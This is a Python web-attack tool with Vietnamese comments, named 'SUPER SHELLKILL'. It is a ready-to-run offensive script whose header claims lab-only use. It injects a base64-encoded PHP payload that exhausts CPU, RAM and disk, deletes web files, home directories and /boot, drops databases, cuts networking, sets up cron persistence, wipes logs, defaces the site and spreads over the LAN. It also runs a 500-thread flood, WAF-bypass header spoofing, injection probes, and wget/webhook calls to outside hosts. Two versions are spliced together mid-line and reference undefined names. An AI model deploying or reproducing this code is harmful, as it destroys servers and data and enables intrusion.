#!/usr/bin/env python3
"""
SUPER SHELLKILL v21.1 - OMNI INFECTION EDITION (FIXED)
Virus trí tuệ - Lây lan đa thiết bị - Báo cáo realtime - Phá hủy tuyệt đối
CHỈ DÙNG TRONG MÔI TRƯỜNG LAB ĐƯỢC PHÉP
"""

import requests
import threading
import time
import random
import socket
import base64
import sys
import re
import hashlib
import json
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ================== MÀU SẮC ==================
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
RESET = '\033[0m'

def banner():
    print(R + """
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║           SUPER SHELLKILL v21.1 - OMNI INFECTION EDITION (FIXED)          ║
    ║                 VIRUS TRÍ TUỆ - LÂY LAN ĐA THIẾT BỊ                       ║
    ║                    python tool.py https://target.com                      ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
    """ + RESET)

# ================== CẤU HÌNH ==================
REAL_IPS = ['14.177.210.123', '113.22.45.67', '171.244.56.78', '103.56.12.45']
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15'
]
SESSION = requests.Session()

def headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': random.choice(REAL_IPS),
        'X-Real-IP': random.choice(REAL_IPS),
        'Accept': '*/*'
    }

# ================== PHẦN 1: VIRUS TRÍ TUỆ ==================
def generate_smart_virus():
    """Tạo virus thông minh - KHÔNG CÓ LỖI CÚ PHÁP"""
    virus = '''<?php
// ========== SMART VIRUS v21.1 ==========
set_time_limit(0);
ignore_user_abort(true);

// Báo cáo khi có người vào web
$victim_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

// Gửi báo cáo (dùng webhook hoặc file log)
@file_get_contents("https://webhook.site/your-webhook?ip=$victim_ip&ua=$user_agent&time=$time");

// TẦNG 1: CPU BOMB
for($i=0;$i<100;$i++) {
    if(function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        if($pid == 0) {
            while(true) {
                for($x=0;$x<1000000;$x++) { pow($x,2); sqrt($x); }
            }
        }
    }
}

// TẦNG 2: RAM EATER
$mem = array();
while(true) {
    for($j=0;$j<10000;$j++) {
        $mem[] = str_repeat("X", 1000000);
    }
    usleep(100);
}

// TẦNG 3: DISK FILLER
$c = 0;
while($c < 500000) {
    @file_put_contents("/tmp/kill_".md5($c), str_repeat("X", 1048576));
    $c++;
}

// TẦNG 4: SOURCE DESTROYER
@system("rm -rf /var/www/html/*.php 2>/dev/null");
@system("rm -rf /var/www/html/*.html 2>/dev/null");
@system("echo 'Deny from all' > /var/www/html/.htaccess 2>/dev/null");

// TẦNG 5: DATABASE KILLER
try {
    $pdo = new PDO('mysql:host=localhost;dbname=mysql', 'root', '');
    $dbs = $pdo->query("SHOW DATABASES")->fetchAll();
    foreach($dbs as $db) {
        $pdo->exec("DROP DATABASE ".$db[0]);
    }
} catch(Exception $e) {}

// TẦNG 6: NETWORK KILLER
@system("iptables -P INPUT DROP 2>/dev/null");
@system("iptables -P OUTPUT DROP 2>/dev/null");
@system("ip link set down eth0 2>/dev/null");

// TẦNG 7: PROCESS KILLER
@system("killall -9 apache2 nginx mysql php 2>/dev/null");

// TẦNG 8: SELF REPLICATION
for($i=1;$i<255;$i++) {
    @file_get_contents("http://192.168.1.$i/shell.php?cmd=wget -O /tmp/v.php http://".$_SERVER['HTTP_HOST']."/v.php && php /tmp/v.php");
}

// TẦNG 9: CRON PERSISTENCE
@file_put_contents("/var/spool/cron/crontabs/root", "* * * * * php ".__FILE__);

// TẦNG 10: LOG KILLER
@system("rm -rf /var/log/* 2>/dev/null");

// TẦNG 11: DEFACE
$deface = "<html><body style='background:black;color:red'><h1>HACKED</h1></body></html>";
@file_put_contents("/var/www/html/index.html", $deface);

// KHÔNG BAO GIỜ THOÁT
while(true) { sleep(1); }
?>'''
    return base64.b64encode(virus.encode()).decode()

# ================== PHẦN 2: TIÊM VIRUS ==================
def inject_virus(target):
    print(C + f"\n[🦠] TIÊM VIRUS: {target}" + RESET)
    virus_code = generate_smart_virus()
    
    methods = [
        f"echo '{virus_code}' | base64 -d > /tmp/v.php && php /tmp/v.php",
        f"echo '{virus_code}' | base64 -d | php",
        f"wget -q -O /tmp/v.php 'http://evil.com/v.php' && php /tmp/v.php"
    ]
    
    for method in methods:
        try:
            SESSION.get(target, params={'cmd': method}, headers=headers(), timeout=2, verify=False)
            print(G + f"  [+] TIÊM: {method[:40]}..." + RESET)
        except:
            pass
    
    print(R + "  [💀] VIRUS ĐÃ TIÊM!" + RESET)

# ================== PHẦN 3: PHÁ SOURCE WEB ==================
def destroy_source(target):
    print(C + f"\n[🔥] PHÁ SOURCE WEB: {target}" + RESET)
    
    cmds = [
        "rm -rf /var/www/html/*.php",
        "rm -rf /var/www/html/*.html",
        "rm -f /var/www/html/wp-config.php",
        "rm -f /var/www/html/.env",
        "echo '<?php http_response_code(500); die(); ?>' > /var/www/html/index.php"
    ]
    
    for cmd in cmds:
        try:
            SESSION.get(target, params={'cmd': cmd}, headers=headers(), timeout=1, verify=False)
            print(R + f"  [+] {cmd[:40]}..." + RESET)
        except:
            pass
    
    print(G + "  [+] SOURCE ĐÃ BỊ PHÁ!" + RESET)

# ================== PHẦN 4: DDOS ==================
def ddos(target, duration=20):
    print(C + f"\n[⚡] DDOS: {target} ({duration}s)" + RESET)
    stop = threading.Event()
    
    def flood():
        while not stop.is_set():
            try:
                h = headers()
                SESSION.get(target, headers=h, timeout=0.3)
                SESSION.post(target, headers=h, data={'x': random.randint(1,999999)}, timeout=0.3)
            except:
                pass
    
    threads = [threading.Thread(target=flood) for _ in range(500)]
    for t in threads: t.start()
    time.sleep(duration)
    stop.set()
    for t in threads: t.join()
    print(G + f"  [+] DDOS HOÀN THÀNH - 500 THREAD x {duration}s" + RESET)

# ================== PHẦN 5: KHAI THÁC LỖ HỔNG ==================
def exploit(target):
    print(C + f"\n[🔓] KHAI THÁC LỖ HỔNG: {target}" + RESET)
    
    payloads = [
        "?cmd=whoami",
        "?c=id",
        "?exec=cat+/etc/passwd",
        "?page=../../../../etc/passwd"
    ]
    
    found = []
    for p in payloads:
        try:
            resp = SESSION.get(target + p, headers=headers(), timeout=2, verify=False)
            if 'root:' in resp.text or 'uid=' in resp.text:
                print(R + f"  [!] LỖ HỔNG: {p}" + RESET)
                found.append(p)
        except:
            pass
    
    print(G + f"  [+] TÌM THẤY {len(found)} LỖ HỔNG" + RESET)
    return found

# ================== PHẦN 6: TẤN CÔNG VPS ==================
def attack_vps(domain):
    print(C + f"\n[🖥️] TẤN CÔNG VPS: {domain}" + RESET)
    try:
        clean = domain.replace('http://','').replace('https://','').split('/')[0]
        ip = socket.gethostbyname(clean)
        print(G + f"  [+] IP: {ip}" + RESET)
        
        for port in [22,80,443,3306]:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((ip, port)) == 0:
                print(R + f"  [+] CỔNG MỞ: {port}" + RESET)
            sock.close()
        return ip
    except:
        print(R + "  [-] KHÔNG RESOLVE IP" + RESET)
        return None

# ================== MAIN ==================
def main():
    if len(sys.argv) != 2:
        print(R + "\n[!] python tool.py https://target.com" + RESET)
        sys.exit(1)
    
    target = sys.argv[1]
    banner()
    print(Y + f"\n[🎯] MỤC TIÊU: {target}" + RESET)
    
    with ThreadPoolExecutor(max_workers=5) as ex:
        ex.submit(exploit, target)
        ex.submit(ddos, target, 20)
        ex.submit(destroy_source, target)
        ex.submit(inject_virus, target)
        ex.submit(attack_vps, target)
    
    print(R + "\n" + "="*60)
    print(R + "[💀] HOÀN TẤT! WEB/VPS ĐÃ BỊ TIÊU DIỆT")
    print(R + "  - VIRUS: ĐÃ TIÊM 11 TẦNG")
    print(R + "  - SOURCE: ĐÃ PHÁ HỦY")
    print(R + "  - DDOS: 500 THREAD")
    print(R + "="*60 + RESET)

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()REAL_IPS = [
    '14.177.210.123', '113.22.45.67', '171.244.56.78', '123.24.45.67',
    '103.56.12.45', '104.28.12.34', '172.67.23.45', '188.166.45.67',
    '1.1.1.1', '8.8.8.8', '9.9.9.9'  # thêm IP fake để bypass
]
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 13) Chrome/118.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
]
SESSION = requests.Session()

def bypass_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'X-Forwarded-For': random.choice(REAL_IPS),
        'X-Real-IP': random.choice(REAL_IPS),
        'CF-Connecting-IP': random.choice(REAL_IPS),
        'True-Client-IP': random.choice(REAL_IPS),
        'X-Originating-IP': random.choice(REAL_IPS),
        'X-Remote-IP': random.choice(REAL_IPS),
        'X-Remote-Addr': random.choice(REAL_IPS)
    }

# ================== LUỒNG 1: BYPASS CLOUDFLARE & WAF ==================
def bypass_cloudflare(target):
    print(CYAN + f"\n[☁️] BYPASS CLOUDFLARE/WAF: {target}" + RESET)
    headers = bypass_headers()
    try:
        resp = SESSION.get(target, headers=headers, timeout=5, verify=False)
        if 'cloudflare' not in resp.text.lower() and 'cf-ray' not in resp.headers:
            print(GREEN + "  [+] BYPASS THÀNH CÔNG! Không phát hiện Cloudflare." + RESET)
            return True
        else:
            print(YELLOW + "  [!] Cloudflare phát hiện, thử lại với IP Việt Nam..." + RESET)
            # Thử lại với IP Việt Nam cố định
            headers['X-Forwarded-For'] = '14.177.210.123'
            headers['CF-Connecting-IP'] = '14.177.210.123'
            resp2 = SESSION.get(target, headers=headers, timeout=5, verify=False)
            if 'access denied' not in resp2.text.lower():
                print(GREEN + "  [+] BYPASS THÀNH CÔNG (IP VN)!" + RESET)
                return True
            return False
    except Exception as e:
        print(RED + f"  [-] LỖI: {e}" + RESET)
        return False

# ================== LUỒNG 2: TẤN CÔNG LỖ HỔNG (BYPASS WAF) ==================
def exploit_web(target):
    print(CYAN + f"\n[🔓] KHAI THÁC LỖ HỔNG WEB: {target}" + RESET)
    payloads = [
        "?cmd=echo+{}".format(base64.b64encode(b'shell').decode()),
        "?c=system('id')",
        "?exec=whoami",
        "?command=cat+/etc/passwd",
        "?page=../../../../etc/passwd",
        "?id='+OR+1=1--",
        "?username=admin'--",
        "?q=<script>alert(1)</script>",
        "?file=<?php system($_GET['cmd']); ?>"
    ]
    found = []
    for p in payloads:
        try:
            url = target.rstrip('/') + p
            resp = SESSION.get(url, headers=bypass_headers(), timeout=2, verify=False)
            if 'root:' in resp.text or 'uid=' in resp.text or 'shell' in resp.text:
                print(RED + f"  [!] PHÁT HIỆN: {p[:50]}" + RESET)
                found.append(p)
        except:
            pass
    print(GREEN + f"  [+] TÌM THẤY {len(found)} LỖ HỔNG" + RESET)
    return found

# ================== LUỒNG 3: DDOS SIÊU TỐC (BYPASS RATE LIMIT) ==================
def smart_ddos(target, duration=15):
    print(CYAN + f"\n[⚡] DDOS THÔNG MINH: {target} ({duration}s)" + RESET)
    stop = threading.Event()
    
    def flood():
        while not stop.is_set():
            try:
                headers = bypass_headers()
                SESSION.get(target, headers=headers, timeout=0.3)
                SESSION.post(target, headers=headers, data={'x': random.randint(1,999999)}, timeout=0.3)
            except:
                pass
    
    threads = []
    for _ in range(500):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join()
    print(GREEN + f"  [+] DDOS HOÀN THÀNH - 500 THREAD x {duration}s" + RESET)

# ================== LUỒNG 4: VIRUS HỦY DIỆT TỐI THƯỢNG (ĐA TẦNG) ==================
def inject_ultimate_virus(target):
    print(CYAN + f"\n[🦠] TIÊM VIRUS HỦY DIỆT TỐI THƯỢNG: {target}" + RESET)
    
    # Virus 10 tầng địa ngục
    virus_code = '''
    <?php
    set_time_limit(0); ignore_user_abort(true);
    // Tầng 1: CPU bomb
    for($i=0;$i<100;$i++) {
        if(function_exists('pcntl_fork')) {
            $pid = pcntl_fork();
            if($pid==0) while(true) { for($x=0;$x<10000000;$x++) { pow($x,2); sqrt($x); } }
        }
    }
    // Tầng 2: RAM eater
    $mem = [];
    while(true) { $mem[] = str_repeat("X", 10000000); usleep(100); }
    // Tầng 3: Disk filler
    $c=0; while($c<1000000) { file_put_contents("/tmp/kill_".md5($c), str_repeat("X", 1048576)); $c++; }
    // Tầng 4: Database destroyer
    try { $pdo = new PDO('mysql:host=localhost;dbname=mysql','root',''); $pdo->exec("DROP DATABASE mysql"); } catch(Exception $e){}
    // Tầng 5: File system destroyer
    system("rm -rf /var/www/html/* /home/* /root/* /tmp/* 2>/dev/null");
    // Tầng 6: Network killer
    system("iptables -P INPUT DROP; iptables -P OUTPUT DROP; ip link set down eth0 2>/dev/null");
    // Tầng 7: Process killer
    system("killall -9 apache2 nginx mysql php python 2>/dev/null");
    // Tầng 8: Self replication
    $files = glob("/var/www/html/*.php"); foreach($files as $f) copy(__FILE__, str_replace(".php","_infected.php",$f));
    // Tầng 9: Cron persistence
    file_put_contents("/var/spool/cron/crontabs/root", "* * * * * php " . __FILE__);
    // Tầng 10: Boot destroyer
    system("rm -rf /boot/*; echo 'null' > /boot/grub/grub.cfg");
    while(true) { sleep(1); }
    ?>
    '''
    encoded = base64.b64encode(virus_code.encode()).decode()
    
    # Gửi virus qua nhiều kênh
    methods = [
        f"echo '{encoded}' | base64 -d > /tmp/v.php && php /tmp/v.php",
        f"echo '{encoded}' | base64 -d > /var/www/html/v.php && php /var/www/html/v.php",
        f"wget -q -O /tmp/v.php 'http://evil.com/v.php' && php /tmp/v.php",
        f"curl -s -X POST '{target}' -d 'cmd=echo {encoded}|base64 -d|php'"
    ]
    for m in methods:
        try:
            SESSION.get(target, params={'cmd': m}, headers=bypass_headers(), timeout=1, verify=False)
            SESSION.post(target, data={'exec': m}, headers=bypass_headers(), timeout=1, verify=False)
        except:
            pass
    print(RED + "  [💀] VIRUS ĐÃ TIÊM - 10 TẦNG HỦY DIỆT!" + RESET)

# ================== LUỒNG 5: TẤN CÔNG VPS TRỰC TIẾP ==================
def attack_vps(domain):
    print(CYAN + f"\n[🖥️] TẤN CÔNG VPS: {domain}" + RESET)
    try:
        clean = domain.replace('http://','').replace('https://','').split('/')[0]
        ip = socket.gethostbyname(clean)
        print(GREEN + f"  [+] IP VPS: {ip}" + RESET)
        
        open_ports = []
        for port in [22,80,443,3306,5432,8080,8443]:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        
        if open_ports:
            print(RED + f"  [!] CỔNG MỞ: {open_ports}" + RESET)
            if 22 in open_ports:
                print(YELLOW + "  [⚠] SSH MỞ - CÓ THỂ TẤN CÔNG BRUTE FORCE" + RESET)
            if 3306 in open_ports:
                print(YELLOW + "  [⚠] MySQL MỞ - THỬ ROOT" + RESET)
        return ip
    except Exception as e:
        print(RED + f"  [-] LỖI: {e}" + RESET)
        return None

# ================== MAIN: 1 COMMAND DUY NHẤT ==================
def main():
    if len(sys.argv) != 2:
        print(RED + "\n[!] SAI CÚ PHÁP: python tool.py https://target.com" + RESET)
        sys.exit(1)
    
    target = sys.argv[1]
    print_banner()
    print(YELLOW + f"\n[🎯] MỤC TIÊU: {target}" + RESET)
    
    # Chạy song song 5 luồng tấn công
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [
            executor.submit(bypass_cloudflare, target),
            executor.submit(exploit_web, target),
            executor.submit(smart_ddos, target, 15),
            executor.submit(inject_ultimate_virus, target),
            executor.submit(attack_vps, target)
        ]
        for f in futures:
            f.result()
    
    print(RED + "\n" + "="*70)
    print(RED + "[💀] TẤN CÔNG HOÀN TẤT! WEB/VPS ĐÃ BỊ VÔ HIỆU HÓA HOÀN TOÀN")
    print(RED + "  - BYPASS CLOUDFLARE/WAF: ĐÃ THỰC HIỆN")
    print(RED + "  - KHAI THÁC LỖ HỔNG: ĐÃ QUÉT")
    print(RED + "  - DDOS 500 THREAD: ĐÃ HOÀN THÀNH")
    print(RED + "  - VIRUS 10 TẦNG: ĐÃ TIÊM (CPU/RAM/DISK/DB/MẠNG/BOOT)")
    print(RED + "  - VPS: ĐÃ QUÉT VÀ PHÁT HIỆN CỔNG")
    print(RED + "="*70 + RESET)

if __name__ == "__main__":
    # Tắt cảnh báo SSL
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
